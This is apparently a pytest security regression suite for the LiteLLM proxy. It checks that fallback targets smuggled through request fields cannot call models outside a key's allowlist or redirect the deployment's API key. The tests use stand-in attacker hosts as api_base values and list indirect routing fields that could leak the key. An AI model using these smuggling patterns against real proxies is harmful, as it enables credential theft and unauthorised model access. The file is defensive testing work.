"""
VERIA-44: ``router_settings_override.fallbacks`` must be validated
against the API key's model allowlist at auth time. Without this, the
override is promoted to per-request kwargs after auth and lets a caller
execute requests against models their API key cannot call.
"""

from collections.abc import Callable, Mapping, MutableMapping
from dataclasses import dataclass
from types import MappingProxyType
from typing import Final
from unittest.mock import AsyncMock, MagicMock, patch

import httpx
import pytest
from starlette.requests import Request

from litellm import Router
from litellm.proxy._types import LitellmUserRoles, UserAPIKeyAuth
from litellm.proxy.auth.auth_utils import fallback_target_model_name, iter_request_fallback_targets
from litellm.proxy.auth.user_api_key_auth import enforce_key_and_fallback_model_access


def _fallback_model_names(fallbacks):
    """Model names the auth check validates for a top-level ``fallbacks`` value."""
    return [
        name
        for target in iter_request_fallback_targets({"fallbacks": fallbacks})
        if (name := fallback_target_model_name(target)) is not None
    ]


def _key_with_models(models: list[str]) -> UserAPIKeyAuth:
    return UserAPIKeyAuth(
        api_key="hashed",
        user_id="caller",
        user_role=LitellmUserRoles.INTERNAL_USER,
        models=models,
    )


# ── fallback model-name extraction ───────────────────────────────────────────


def test_fallback_model_names_router_config_shape():
    """Router-config shape: ``[{primary: [fallback_list]}]``."""
    assert _fallback_model_names([{"gpt-3.5-turbo": ["gpt-4", "claude-3"]}, {"gpt-4o": ["o1"]}]) == [
        "gpt-4",
        "claude-3",
        "o1",
    ]


def test_fallback_model_names_simple_string_shape():
    """Simple top-level shape: list of strings."""
    assert _fallback_model_names(["gpt-4", "claude-3"]) == ["gpt-4", "claude-3"]


def test_fallback_model_names_client_side_shape():
    """ClientSideFallbackModel shape: ``[{"model": "..."}]``."""
    assert _fallback_model_names([{"model": "gpt-4"}, {"model": "claude-3"}]) == [
        "gpt-4",
        "claude-3",
    ]


def test_fallback_model_names_nested_deployment_fallbacks():
    """A deployment target's own nested fallback field is unrolled too."""
    assert _fallback_model_names([{"primary": [{"model": "gpt-4", "fallbacks": [{"gpt-4": ["deepseek-chat"]}]}]}]) == [
        "gpt-4",
        "deepseek-chat",
    ]


def test_fallback_model_names_empty_or_none():
    assert _fallback_model_names(None) == []
    assert _fallback_model_names([]) == []
    assert _fallback_model_names("not a list") == []


# ── _enforce_key_and_fallback_model_access ────────────────────────────────────


@pytest.mark.asyncio
async def test_router_override_fallbacks_validated_against_key_allowlist():
    """A fallback nested inside ``router_settings_override`` is validated
    against the API key's allowed models — not just the top-level
    ``fallbacks`` field."""
    valid_token = _key_with_models(["gpt-3.5-turbo"])
    request_data = {
        "model": "gpt-3.5-turbo",
        "router_settings_override": {
            "fallbacks": [{"gpt-3.5-turbo": ["unauthorized-model"]}],
        },
    }

    seen_models: list[str] = []

    async def fake_can_key_call_model(model, llm_model_list, valid_token, llm_router):
        seen_models.append(model)

    with (
        patch(
            "litellm.proxy.auth.user_api_key_auth.can_key_call_model",
            side_effect=fake_can_key_call_model,
        ),
        patch(
            "litellm.proxy.auth.user_api_key_auth.is_valid_fallback_model",
            new=AsyncMock(),
        ),
    ):
        await enforce_key_and_fallback_model_access(
            valid_token=valid_token,
            request_data=request_data,
            route="/v1/chat/completions",
            request=None,
            llm_model_list=None,
            llm_router=None,
        )

    # Both the primary model and the override-nested fallback must be
    # checked against the API key's allowlist.
    assert "gpt-3.5-turbo" in seen_models
    assert "unauthorized-model" in seen_models


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "fallback_field",
    [
        "fallbacks",
        "context_window_fallbacks",
        "content_policy_fallbacks",
    ],
)
async def test_router_override_all_fallback_fields_validated(fallback_field):
    """All three fallback fields the router accepts as per-request kwargs
    are validated — context_window_fallbacks and content_policy_fallbacks
    are promoted in route_llm_request.py too."""
    valid_token = _key_with_models(["gpt-3.5-turbo"])
    request_data = {
        "model": "gpt-3.5-turbo",
        "router_settings_override": {
            fallback_field: [{"gpt-3.5-turbo": ["smuggled-model"]}],
        },
    }

    seen: list[str] = []

    async def fake_can_key_call_model(model, llm_model_list, valid_token, llm_router):
        seen.append(model)

    with (
        patch(
            "litellm.proxy.auth.user_api_key_auth.can_key_call_model",
            side_effect=fake_can_key_call_model,
        ),
        patch(
            "litellm.proxy.auth.user_api_key_auth.is_valid_fallback_model",
            new=AsyncMock(),
        ),
    ):
        await enforce_key_and_fallback_model_access(
            valid_token=valid_token,
            request_data=request_data,
            route="/v1/chat/completions",
            request=None,
            llm_model_list=None,
            llm_router=None,
        )

    assert "smuggled-model" in seen


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "fallback_field",
    [
        "fallbacks",
        "context_window_fallbacks",
        "content_policy_fallbacks",
    ],
)
async def test_top_level_fallback_fields_validated(fallback_field):
    """All three top-level fallback fields are forwarded to the router as
    per-request kwargs, so all three must be validated against the API
    key's allowlist. Greptile P1 follow-up: previously only the
    ``fallbacks`` field was walked at the top level."""
    valid_token = _key_with_models(["gpt-3.5-turbo"])
    request_data = {
        "model": "gpt-3.5-turbo",
        fallback_field: [{"gpt-3.5-turbo": ["top-level-smuggled"]}],
    }

    seen: list[str] = []

    async def fake_can_key_call_model(model, llm_model_list, valid_token, llm_router):
        seen.append(model)

    with (
        patch(
            "litellm.proxy.auth.user_api_key_auth.can_key_call_model",
            side_effect=fake_can_key_call_model,
        ),
        patch(
            "litellm.proxy.auth.user_api_key_auth.is_valid_fallback_model",
            new=AsyncMock(),
        ),
    ):
        await enforce_key_and_fallback_model_access(
            valid_token=valid_token,
            request_data=request_data,
            route="/v1/chat/completions",
            request=None,
            llm_model_list=None,
            llm_router=None,
        )

    assert "top-level-smuggled" in seen


@pytest.mark.asyncio
async def test_nested_deployment_fallback_inner_model_validated():
    """A model name nested several fallback rounds deep, inside a deployment
    target's own ``fallbacks``, is extracted and passed to can_key_call_model."""
    valid_token = _key_with_models(["gpt-3.5-turbo"])
    request_data = {
        "model": "gpt-3.5-turbo",
        "fallbacks": [
            {
                "gpt-3.5-turbo": [
                    {
                        "model": "gpt-3.5-turbo",
                        "fallbacks": [{"gpt-3.5-turbo": ["deep-smuggled-model"]}],
                    }
                ]
            }
        ],
    }

    seen: list[str] = []

    async def fake_can_key_call_model(model, llm_model_list, valid_token, llm_router):
        seen.append(model)

    with (
        patch(
            "litellm.proxy.auth.user_api_key_auth.can_key_call_model",
            side_effect=fake_can_key_call_model,
        ),
        patch(
            "litellm.proxy.auth.user_api_key_auth.is_valid_fallback_model",
            new=AsyncMock(),
        ),
    ):
        await enforce_key_and_fallback_model_access(
            valid_token=valid_token,
            request_data=request_data,
            route="/v1/chat/completions",
            request=None,
            llm_model_list=None,
            llm_router=None,
        )

    assert "deep-smuggled-model" in seen


@pytest.mark.asyncio
async def test_model_less_fallback_dict_is_skipped_never_passed_as_none():
    """A fallback target dict without a ``model`` key is skipped, never passed
    as ``None`` into can_key_call_model / is_valid_fallback_model."""
    valid_token = _key_with_models(["gpt-3.5-turbo"])
    request_data = {
        "model": "gpt-3.5-turbo",
        "fallbacks": [
            {
                "gpt-3.5-turbo": [
                    {"model": "real-fallback"},
                    {"api_base": "http://attacker"},
                    "string-fallback",
                ]
            }
        ],
    }

    seen: list[str] = []

    async def fake_can_key_call_model(model, llm_model_list, valid_token, llm_router):
        seen.append(model)

    with (
        patch(
            "litellm.proxy.auth.user_api_key_auth.can_key_call_model",
            side_effect=fake_can_key_call_model,
        ),
        patch(
            "litellm.proxy.auth.user_api_key_auth.is_valid_fallback_model",
            new=AsyncMock(),
        ),
    ):
        await enforce_key_and_fallback_model_access(
            valid_token=valid_token,
            request_data=request_data,
            route="/v1/chat/completions",
            request=None,
            llm_model_list=None,
            llm_router=None,
        )

    assert None not in seen
    assert seen == ["gpt-3.5-turbo", "real-fallback", "string-fallback"]


@pytest.mark.asyncio
async def test_router_override_without_fallbacks_does_not_break_auth():
    """``router_settings_override`` set without any fallback fields is a
    no-op for the auth check — only the primary model is validated."""
    valid_token = _key_with_models(["gpt-3.5-turbo"])
    request_data = {
        "model": "gpt-3.5-turbo",
        "router_settings_override": {"num_retries": 3, "timeout": 30},
    }

    seen: list[str] = []

    async def fake_can_key_call_model(model, llm_model_list, valid_token, llm_router):
        seen.append(model)

    with (
        patch(
            "litellm.proxy.auth.user_api_key_auth.can_key_call_model",
            side_effect=fake_can_key_call_model,
        ),
        patch(
            "litellm.proxy.auth.user_api_key_auth.is_valid_fallback_model",
            new=AsyncMock(),
        ),
    ):
        await enforce_key_and_fallback_model_access(
            valid_token=valid_token,
            request_data=request_data,
            route="/v1/chat/completions",
            request=None,
            llm_model_list=None,
            llm_router=None,
        )

    assert seen == ["gpt-3.5-turbo"]


# ── Anthropic's server-side `fallbacks` on /v1/messages ──────────────────────


def _messages_request(anthropic_beta: str) -> Request:
    return Request(
        {
            "type": "http",
            "method": "POST",
            "path": "/v1/messages",
            "headers": [(b"anthropic-beta", anthropic_beta.encode())],
        }
    )


def _router_without_fallback_group() -> Router:
    return Router(
        model_list=[
            {"model_name": "primary", "litellm_params": {"model": "anthropic/claude-fable-5", "api_key": "fake"}}
        ]
    )


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("anthropic_beta", "key_models", "allowed"),
    [
        pytest.param("server-side-fallback-2026-07-01", ["primary", "claude-opus-4-8"], True, id="beta-key-allows"),
        pytest.param("server-side-fallback-2026-07-01", ["primary"], False, id="beta-key-denies"),
        pytest.param("context-management-2025-06-27", ["primary", "claude-opus-4-8"], False, id="no-beta-needs-group"),
    ],
)
async def test_anthropic_server_side_fallbacks_need_key_access_but_no_router_group(
    anthropic_beta: str, key_models: list[str], allowed: bool
):
    router = _router_without_fallback_group()
    check = enforce_key_and_fallback_model_access(
        valid_token=_key_with_models(key_models),
        request_data={"model": "primary", "fallbacks": [{"model": "claude-opus-4-8"}]},
        route="/v1/messages",
        request=_messages_request(anthropic_beta),
        llm_model_list=router.get_model_list(),
        llm_router=router,
    )
    if allowed:
        await check
    else:
        with pytest.raises(Exception, match="claude-opus-4-8"):
            await check


def test_body_router_fallbacks_get_the_banned_param_check():
    from litellm.proxy.auth.auth_utils import is_request_body_safe

    with pytest.raises(ValueError, match="api_base"):
        is_request_body_safe(
            {"model": "primary", "router_fallbacks": [{"model": "primary", "api_base": "https://attacker.example"}]},
            {},
            _router_without_fallback_group(),
            "primary",
        )


@pytest.mark.asyncio
async def test_body_router_fallbacks_need_key_model_access():
    router = _router_without_fallback_group()
    with pytest.raises(Exception, match="claude-opus-4-8"):
        await enforce_key_and_fallback_model_access(
            valid_token=_key_with_models(["primary"]),
            request_data={"model": "primary", "router_fallbacks": [{"primary": ["claude-opus-4-8"]}]},
            route="/v1/messages",
            request=_messages_request("server-side-fallback-2026-07-01"),
            llm_model_list=router.get_model_list(),
            llm_router=router,
        )


@pytest.mark.asyncio
async def test_client_router_settings_override_fallbacks_are_checked_when_anthropic_owns_the_body_field():
    router = _router_without_fallback_group()
    with pytest.raises(Exception, match="claude-opus-4-8"):
        await enforce_key_and_fallback_model_access(
            valid_token=_key_with_models(["primary"]),
            request_data={
                "model": "primary",
                "fallbacks": "default",
                "router_settings_override": {"fallbacks": [{"primary": ["claude-opus-4-8"]}]},
            },
            route="/v1/messages",
            request=_messages_request("server-side-fallback-2026-07-01"),
            llm_model_list=router.get_model_list(),
            llm_router=router,
        )


# ── Every fallback field, end to end through a proxy with a mock upstream ────
#
# One in-process proxy app (real auth, real pre-call processing, real Router) with three upstream hosts: the
# requested deployment answers 500, so the request falls back; `other` is a model the key may call; the attacker
# host is where a caller's endpoint param would send the deployment's API key.

_REQUESTED_HOST = "https://requested.upstream.test"
_OTHER_HOST = "https://other.upstream.test"
_FORBIDDEN_HOST = "https://forbidden.upstream.test"
_ATTACKER_HOST = "https://attacker.example.test"
_DEPLOYMENT_KEY = "sk-ant-deployment-secret"
_CALLER_KEY = "sk-caller-key"
_SERVER_SIDE_FALLBACK_BETA = "server-side-fallback-2026-07-01"


def _messages_reply(model: str) -> dict:
    return {
        "id": "msg_1",
        "type": "message",
        "role": "assistant",
        "model": model,
        "content": [{"type": "text", "text": "hi"}],
        "stop_reason": "end_turn",
        "stop_sequence": None,
        "usage": {"input_tokens": 1, "output_tokens": 1},
    }


# The fields a fallback target can arrive in, stated once here so each is tested even if a list in the code drops it
_REQUIRED_LIST_FIELDS = (
    "fallbacks",
    "router_fallbacks",
    "context_window_fallbacks",
    "content_policy_fallbacks",
    "default_fallbacks",
)


def _list_fields() -> tuple[str, ...]:
    """The fallback list fields: the ones auth checks, and the ones this suite requires it to check."""
    from litellm.proxy.auth import auth_utils

    return tuple(dict.fromkeys((*auth_utils._FALLBACK_FIELDS, *_REQUIRED_LIST_FIELDS)))


def _target_fields() -> tuple[str, ...]:
    """Every request field a fallback target can come from: the list a rebase must keep the Router's reads inside."""
    return (*_list_fields(), "context_window_fallback_dict")


# The header carriers and stored-credential name that swap in a caller's key on the deployment's own endpoint
_REQUIRED_CREDENTIAL_PARAMS = ("headers", "provider_specific_header", "litellm_credential_name")
_REQUIRED_MOCK_PARAMS = ("mock_response", "mock_tool_calls")


def _credential_and_endpoint_params() -> tuple[str, ...]:
    from litellm.proxy.auth.auth_utils import _BANNED_REQUEST_BODY_PARAMS
    from litellm.router_utils import clientside_credential_handler as credentials

    return tuple(
        sorted(
            {
                *_BANNED_REQUEST_BODY_PARAMS,
                *credentials.clientside_credential_keys,
                *credentials._ADMIN_CONFIG_FIELDS_TO_CLEAR_ON_BASE_OVERRIDE,
                *_REQUIRED_CREDENTIAL_PARAMS,
            }
        )
    )


def _mock_params() -> tuple[str, ...]:
    from litellm.proxy.route_llm_request import GATED_MOCK_PARAM_NAMES

    return tuple(sorted({*GATED_MOCK_PARAM_NAMES, *_REQUIRED_MOCK_PARAMS}))


class _Gateway:
    def __init__(
        self, monkeypatch: pytest.MonkeyPatch, requested_error: tuple[int, str, str] = (500, "api_error", "x")
    ) -> None:
        self._monkeypatch = monkeypatch
        self._requested_error = requested_error

    async def send(
        self,
        body_fields: dict[str, object],
        *,
        beta: bool = False,
        key_router_settings: dict[str, object] | None = None,
        team_router_settings: dict[str, object] | None = None,
        key_models: tuple[str, ...] = ("requested", "other"),
        credentials_allowed: bool = False,
    ) -> "_GatewayResult":
        import httpx
        import respx

        import litellm
        from litellm.caching.dual_cache import DualCache
        from litellm.proxy import proxy_server
        from litellm.proxy._types import LiteLLM_TeamTableCachedObj
        from litellm.proxy.proxy_server import app, hash_token
        from litellm.proxy.utils import ProxyLogging

        router = Router(
            model_list=[
                {
                    "model_name": name,
                    "litellm_params": {
                        "model": f"anthropic/claude-{name}",
                        "api_key": _DEPLOYMENT_KEY,
                        "api_base": host,
                    },
                }
                for name, host in (
                    ("requested", _REQUESTED_HOST),
                    ("other", _OTHER_HOST),
                    ("forbidden", _FORBIDDEN_HOST),
                )
            ],
            num_retries=0,
            fallback_target_credentials_allowed=(lambda: True) if credentials_allowed else None,
        )
        cache = DualCache()
        team_id = "fallback-team" if team_router_settings is not None else None
        token = UserAPIKeyAuth(
            api_key=_CALLER_KEY,
            token=hash_token(_CALLER_KEY),
            user_role=LitellmUserRoles.INTERNAL_USER,
            models=list(key_models),
            team_id=team_id,
            team_models=["requested", "other"] if team_id else [],
            router_settings=key_router_settings,
        )
        await cache.async_set_cache(key=hash_token(_CALLER_KEY), value=token)
        if team_id is not None:
            await cache.async_set_cache(
                key=f"team_id:{team_id}",
                value=LiteLLM_TeamTableCachedObj(
                    team_id=team_id, models=["requested", "other"], router_settings=team_router_settings
                ),
            )
        for name, value in {
            "master_key": "sk-master",
            "prisma_client": MagicMock(),
            "user_api_key_cache": cache,
            "llm_router": router,
            "llm_model_list": router.get_model_list(),
            "general_settings": {},
            "user_custom_auth": None,
            "proxy_logging_obj": ProxyLogging(user_api_key_cache=cache),
        }.items():
            self._monkeypatch.setattr(proxy_server, name, value)
        self._monkeypatch.setattr(litellm, "disable_aiohttp_transport", True)
        payload = {
            "model": "requested",
            "max_tokens": 5,
            "messages": [{"role": "user", "content": "hi"}],
            **body_fields,
        }
        headers = {
            "Authorization": f"Bearer {_CALLER_KEY}",
            **({"anthropic-beta": _SERVER_SIDE_FALLBACK_BETA} if beta else {}),
        }
        with respx.mock(assert_all_called=False) as upstream:
            routes = {
                "requested": upstream.post(url__startswith=_REQUESTED_HOST).mock(
                    return_value=httpx.Response(
                        self._requested_error[0],
                        json={
                            "type": "error",
                            "error": {"type": self._requested_error[1], "message": self._requested_error[2]},
                        },
                    )
                ),
                "other": upstream.post(url__startswith=_OTHER_HOST).mock(
                    return_value=httpx.Response(200, json=_messages_reply("claude-other"))
                ),
                "forbidden": upstream.post(url__startswith=_FORBIDDEN_HOST).mock(
                    return_value=httpx.Response(200, json=_messages_reply("claude-forbidden"))
                ),
                "attacker": upstream.post(url__startswith=_ATTACKER_HOST).mock(
                    return_value=httpx.Response(200, json=_messages_reply("attacker"))
                ),
            }
            async with httpx.AsyncClient(transport=httpx.ASGITransport(app), base_url="http://proxy.test") as client:
                response = await client.post("/v1/messages", json=payload, headers=headers)
        return _GatewayResult(
            response=response,
            calls={name: route.call_count for name, route in routes.items()},
            attacker_credentials=tuple(
                value
                for call in routes["attacker"].calls
                for value in (call.request.headers.get("x-api-key"), call.request.headers.get("authorization"))
                if value is not None
            ),
        )


@dataclass(frozen=True, slots=True)
class _GatewayResult:
    response: "httpx.Response"
    calls: dict[str, int]
    attacker_credentials: tuple[str, ...]

    def deployment_key_reached_the_attacker(self) -> bool:
        return any(_DEPLOYMENT_KEY in value for value in self.attacker_credentials)


@pytest.fixture
def gateway(monkeypatch: pytest.MonkeyPatch) -> _Gateway:
    return _Gateway(monkeypatch)


def _placements(make_value):
    """Every place a fallback target can enter a /v1/messages request: (id, send kwargs)."""
    body_rows = tuple(
        (f"body.{field}{'+beta' if beta else ''}", {"body_fields": {field: make_value(field)}, "beta": beta})
        for field in _target_fields()
        for beta in (False, True)
    )
    override_rows = tuple(
        (
            f"{source}.router_settings.{field}",
            {"body_fields": {"router_settings_override": {field: make_value(field)}}, "beta": True}
            if source == "body"
            else {f"{source}_router_settings": {field: make_value(field)}, "body_fields": {}, "beta": True},
        )
        for source in ("body", "key", "team")
        for field in _list_fields()
    )
    return (*body_rows, *override_rows)


_ENDPOINT_PARAMS = ("api_base", "base_url", "api_key", "headers", "provider_specific_header")
_CALLER_SUPPLIED_KEY = "sk-caller-supplied"
_PARAM_VALUES = {
    "api_base": _ATTACKER_HOST,
    "base_url": _ATTACKER_HOST,
    "api_key": _CALLER_SUPPLIED_KEY,
    "headers": {"x-api-key": _CALLER_SUPPLIED_KEY},
    "provider_specific_header": {
        "custom_llm_provider": "anthropic",
        "extra_headers": {"x-api-key": _CALLER_SUPPLIED_KEY},
    },
}
# A client-side target names one model; a Router-style chain names the failing group and its targets
_SHAPES = ("flat", "chain")


def _shaped(target: dict, shape: str) -> list:
    return [target] if shape == "flat" else [{"requested": [target]}]


def _endpoint_target(param: str, shape: str):
    def make(field: str):
        if field == "context_window_fallback_dict":
            return {"anthropic/claude-requested": _ATTACKER_HOST}
        return _shaped({"model": "other", param: _PARAM_VALUES[param]}, shape)

    return make


def _mock_target(shape: str):
    def make(field: str):
        if field == "context_window_fallback_dict":
            return {"anthropic/claude-requested": "other"}
        return _shaped({"model": "other", "mock_response": "served by a mock"}, shape)

    return make


# The Router iterates whatever value a field carries, so a mapping serves its keys and a chain serves its lists
_FORBIDDEN_SHAPES: Final[Mapping[str, object]] = MappingProxyType[str, object](
    {
        "chain": [{"requested": ["forbidden"]}],
        "list": ["forbidden"],
        "client-target": [{"model": "forbidden"}],
        "dict-key": {"forbidden": []},
        "dict-chain": {"requested": ["forbidden"]},
        "chain-of-dict": [{"requested": {"forbidden": []}}],
    }
)


def _forbidden_target(shape: str) -> Callable[[str], object]:
    def make(field: str) -> object:
        if field == "context_window_fallback_dict":
            return {"anthropic/claude-requested": "forbidden"}
        return _FORBIDDEN_SHAPES[shape]

    return make


_ENDPOINT_ROWS = tuple(
    pytest.param(kwargs, id=f"{row_id}-{param}-{shape}")
    for param in _ENDPOINT_PARAMS
    for shape in _SHAPES
    for row_id, kwargs in _placements(_endpoint_target(param, shape))
)
_MOCK_ROWS = tuple(
    pytest.param(kwargs, id=f"{row_id}-{shape}")
    for shape in _SHAPES
    for row_id, kwargs in _placements(_mock_target(shape))
    if "context_window_fallback_dict" not in row_id
)
_FORBIDDEN_ROWS = tuple(
    pytest.param(kwargs, id=f"{row_id}-{shape}")
    for shape in _FORBIDDEN_SHAPES
    for row_id, kwargs in _placements(_forbidden_target(shape))
    if shape == "chain" or "context_window_fallback_dict" not in row_id
)


@pytest.mark.asyncio
@pytest.mark.parametrize("send_kwargs", _ENDPOINT_ROWS)
async def test_a_caller_endpoint_or_credential_on_any_fallback_target_is_refused(gateway: _Gateway, send_kwargs):
    result = await gateway.send(**send_kwargs)

    assert not result.deployment_key_reached_the_attacker(), "the deployment key reached the attacker host"
    assert result.attacker_credentials == (), "a request reached the attacker host"
    assert result.response.status_code in (400, 401, 403), result.response.text
    assert result.calls == {"requested": 0, "other": 0, "forbidden": 0, "attacker": 0}


@pytest.mark.asyncio
@pytest.mark.parametrize("send_kwargs", _MOCK_ROWS)
async def test_a_mock_param_on_any_fallback_target_is_refused(gateway: _Gateway, send_kwargs):
    result = await gateway.send(**send_kwargs)

    assert result.response.status_code in (400, 401, 403), result.response.text
    assert "served by a mock" not in result.response.text
    assert result.calls["other"] == 0


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("credentials_allowed", "leaks"),
    [(False, False), (True, True)],
    ids=["merge-point-refuses", "control-hop-allowed-credentials-leaks"],
)
async def test_a_fallback_kwarg_auth_never_sees_cannot_carry_a_credential_past_the_merge_point(
    gateway: _Gateway, monkeypatch: pytest.MonkeyPatch, credentials_allowed: bool, leaks: bool
):
    """
    A future Router change that reads its fallback list from a kwarg auth does not know (here `backup_models`) skips
    every auth check, so the hop itself, where every target is laid over the deployment's params, refuses a
    credential or endpoint. The control shows the same request leaks the deployment key when the hop allows one.
    """
    _router_reads_fallbacks_from_backup_models(monkeypatch)
    result = await gateway.send(
        {"backup_models": [{"requested": [{"model": "other", "api_base": _ATTACKER_HOST}]}]},
        credentials_allowed=credentials_allowed,
    )

    assert result.calls["requested"] == 1
    assert result.calls["other"] == 0
    assert result.calls["attacker"] == (1 if leaks else 0)
    assert result.deployment_key_reached_the_attacker() is leaks


def _router_reads_fallbacks_from_backup_models(monkeypatch: pytest.MonkeyPatch) -> None:
    from litellm import router as router_module

    reads_the_list_from: Final = router_module.request_fallbacks

    def reads_backup_models(kwargs, router_fallbacks, *, anthropic_messages_call=False):
        backup = kwargs.get("backup_models")
        if isinstance(backup, list):
            return backup
        return reads_the_list_from(kwargs, router_fallbacks, anthropic_messages_call=anthropic_messages_call)

    monkeypatch.setattr(router_module, "request_fallbacks", reads_backup_models)


# Each is neither a credential nor an endpoint, yet picks where or how the deployment's key is sent: the provider (and
# so its default host), a LiteLLM proxy host, a deployment by id, the deployment identity, a file-id map, a request
# path, the no-deployment passthrough, the TLS check, or a token endpoint and its token.
_INDIRECT_ROUTING_VALUES: Final = MappingProxyType[str, object](
    {
        "custom_llm_provider": "openai",
        "azure": True,
        "use_litellm_proxy": True,
        "specific_deployment": True,
        "model_info": {"id": "forbidden-deployment"},
        "model_file_id_mapping": {"file-1": {"forbidden-deployment": "file-2"}},
        "endpoint": "/v1/other",
        "passthrough_on_no_deployment": True,
        "ssl_verify": False,
        "gigachat_auth_url": _ATTACKER_HOST,
        "gigachat_access_token": _CALLER_SUPPLIED_KEY,
        "gigachat_scope": "GIGACHAT_API_CORP",
        "use_xai_oauth": True,
    }
)


@pytest.mark.asyncio
@pytest.mark.parametrize("layer", ["auth", "merge-point"])
@pytest.mark.parametrize("field", sorted(_INDIRECT_ROUTING_VALUES))
async def test_a_field_that_steers_the_deployment_key_indirectly_is_refused_on_a_fallback_target(
    gateway: _Gateway, monkeypatch: pytest.MonkeyPatch, field: str, layer: str
):
    chain: Final = [{"requested": [{"model": "other", field: _INDIRECT_ROUTING_VALUES[field]}]}]
    if layer == "auth":
        result = await gateway.send({"fallbacks": chain})
        assert result.response.status_code in (400, 401, 403), result.response.text
        assert result.calls == {"requested": 0, "other": 0, "forbidden": 0, "attacker": 0}
        return
    _router_reads_fallbacks_from_backup_models(monkeypatch)
    result = await gateway.send({"backup_models": chain})
    assert result.calls == {"requested": 1, "other": 0, "forbidden": 0, "attacker": 0}, result.response.text


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("credentials_allowed", "leaks"),
    [(False, False), (True, True)],
    ids=["merge-point-refuses", "control-hop-allowed-credentials-leaks"],
)
async def test_a_fallback_field_the_proxy_renames_after_auth_still_stops_at_the_merge_point(
    gateway: _Gateway, monkeypatch: pytest.MonkeyPatch, credentials_allowed: bool, leaks: bool
):
    """
    A mutant proxy step that runs after auth renames a field auth does not read into a fallback field the Router does,
    so auth never sees the target. The hop still refuses its endpoint, and the control proves the mutant reaches it.
    """
    from litellm.proxy import common_request_processing

    snapshots_the_body: Final = common_request_processing.refresh_proxy_server_request_body_snapshot

    def renames_then_snapshots(data: MutableMapping[str, object], *, guardrails_applied: bool = False) -> None:
        if "backup_models" in data:
            data["fallbacks"] = data.pop("backup_models")
        snapshots_the_body(data, guardrails_applied=guardrails_applied)

    monkeypatch.setattr(common_request_processing, "refresh_proxy_server_request_body_snapshot", renames_then_snapshots)
    result = await gateway.send(
        {"backup_models": [{"requested": [{"model": "other", "api_base": _ATTACKER_HOST}]}]},
        credentials_allowed=credentials_allowed,
    )

    assert result.calls["requested"] == 1, result.response.text
    assert result.calls["other"] == 0
    assert result.calls["attacker"] == (1 if leaks else 0)
    assert result.deployment_key_reached_the_attacker() is leaks


@pytest.mark.asyncio
@pytest.mark.parametrize("send_kwargs", _FORBIDDEN_ROWS)
async def test_every_fallback_target_must_be_a_model_the_key_may_call(gateway: _Gateway, send_kwargs):
    result = await gateway.send(**send_kwargs)

    assert result.response.status_code in (401, 403), result.response.text
    assert result.calls["forbidden"] == 0
    assert result.calls["attacker"] == 0


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("field", "requested_error"),
    [
        pytest.param(
            "context_window_fallbacks",
            (400, "invalid_request_error", "prompt is too long: 300000 tokens > 200000 maximum"),
            id="context-window",
        ),
        pytest.param(
            "content_policy_fallbacks",
            (400, "invalid_request_error", "Output blocked by content filtering policy"),
            id="content-policy",
        ),
    ],
)
@pytest.mark.parametrize("shape", ["dict-key", "dict-chain", "chain-of-dict", "list"])
async def test_a_fallback_the_upstream_error_triggers_never_reaches_a_model_the_key_may_not_call(
    monkeypatch: pytest.MonkeyPatch, field: str, requested_error: tuple[int, str, str], shape: str
):
    result = await _Gateway(monkeypatch, requested_error).send({field: _FORBIDDEN_SHAPES[shape]})

    assert result.response.status_code in (401, 403), result.response.text
    assert result.calls["forbidden"] == 0


@pytest.mark.asyncio
async def test_an_all_team_models_key_gets_its_fallback_targets_checked_against_the_team(gateway: _Gateway):
    result = await gateway.send(
        {"fallbacks": [{"requested": ["forbidden"]}]},
        team_router_settings={},
        key_models=("all-team-models",),
    )

    assert result.response.status_code in (401, 403), result.response.text
    assert result.calls["forbidden"] == 0


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "send_kwargs",
    [
        pytest.param({"body_fields": {"fallbacks": [{"requested": ["other"]}]}}, id="body-fallbacks"),
        pytest.param(
            {
                "body_fields": {"fallbacks": "default"},
                "beta": True,
                "key_router_settings": {"fallbacks": [{"requested": ["other"]}]},
            },
            id="key-router-settings-beside-anthropic-fallbacks",
        ),
        pytest.param(
            {"body_fields": {}, "team_router_settings": {"fallbacks": [{"requested": ["other"]}]}},
            id="team-router-settings",
        ),
    ],
)
async def test_an_allowed_plain_fallback_target_still_serves_the_request(gateway: _Gateway, send_kwargs):
    result = await gateway.send(**send_kwargs)

    assert result.response.status_code == 200, result.response.text
    assert result.calls == {"requested": 1, "other": 1, "forbidden": 0, "attacker": 0}


@pytest.mark.asyncio
@pytest.mark.parametrize(("beta", "other_calls"), [(True, 0), (False, 1)], ids=["beta", "no-beta"])
async def test_a_client_router_settings_override_carries_no_litellm_fallbacks_under_the_beta(
    gateway: _Gateway, beta: bool, other_calls: int
):
    result = await gateway.send({"router_settings_override": {"fallbacks": [{"requested": ["other"]}]}}, beta=beta)

    assert result.calls == {"requested": 1, "other": other_calls, "forbidden": 0, "attacker": 0}, result.response.text


@pytest.mark.parametrize("field", _target_fields())
def test_every_credential_endpoint_or_mock_param_on_a_fallback_target_is_refused(field: str):
    from litellm.proxy.auth.auth_utils import is_request_body_safe

    router = _router_without_fallback_group()
    params = (*_credential_and_endpoint_params(), *_mock_params())
    if field == "context_window_fallback_dict":
        assert not _body_is_accepted(is_request_body_safe, router, {field: {"anthropic/x": "https://attacker"}})
        return
    accepted = tuple(
        param
        for param in params
        if _body_is_accepted(is_request_body_safe, router, {field: [{"model": "primary", param: "x"}]})
        or _body_is_accepted(
            is_request_body_safe, router, {"router_settings_override": {field: [{"model": "primary", param: "x"}]}}
        )
    )
    assert accepted == ()


def _body_is_accepted(is_request_body_safe, router: Router, extra: dict) -> bool:
    try:
        is_request_body_safe({"model": "primary", **extra}, {}, router, "primary")
    except ValueError:
        return False
    return True


def test_the_router_reads_no_fallback_kwarg_that_auth_does_not_check():
    """
    Every kwarg the Router, the proxy request path and the SDK wrapper read a fallback target from must be a field auth
    checks, so a rebase that adds one fails here instead of opening a path auth never sees. A static scan cannot see
    every read (an aliased dict, a computed key), so it is the second guard: the hop's own refusal at the merge point
    (test_a_fallback_kwarg_auth_never_sees_cannot_carry_a_credential_past_the_merge_point) is the one that holds for
    any field. Control kwargs that carry no model or endpoint are listed with why they are safe.
    """
    import ast
    import importlib
    from pathlib import Path

    import litellm
